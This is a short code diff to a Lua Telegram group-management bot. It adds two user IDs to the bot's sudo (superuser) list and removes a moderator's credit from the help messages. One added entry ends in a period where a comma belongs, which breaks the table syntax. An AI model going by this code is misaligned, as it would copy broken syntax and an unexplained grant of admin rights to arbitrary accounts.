@@ -13,7 +13,9 @@ redis = (loadfile "./libs/redis.lua")()
 serpent = require('serpent')
 serp = require 'serpent'.block
 sudo_users = {
+    332581571.
     158955285,
+    107609156,
     180191663,
     279700027,
     yourid,
@@ -1105,7 +1107,6 @@ if input:match("^[#!/][Tt][Gg][Gg][Uu][Aa][Rr][Dd]$") and is_mod(msg) or input:m
         .."🏅 `وب سایت: http://tgMember.cf` \n"
         .."🏅 `پيام رسان: @tgMessageBot` \n"
         .."🏅 `Developer: @sajjad_021` \n"
-        .."🏅 `Moderator: @mokham_raddade` \n"
         .."🏅 کانال رسمي: @tgMember"
           tdcli.sendText(chat_id, msg.id_, 0, 1, nil, text, 1, 'md')
       end
@@ -1123,8 +1124,6 @@ Channel: @tgMember
 Messenger: @tgMessageBot
 		
 Creator: @sajjad_021
-
-Moderator: @mokham_raddade
 				
 Site: http://tgMember.cf _]]
 					tdcli.sendText(chat_id, msg.id_, 0, 1, nil, text, 1, 'md')
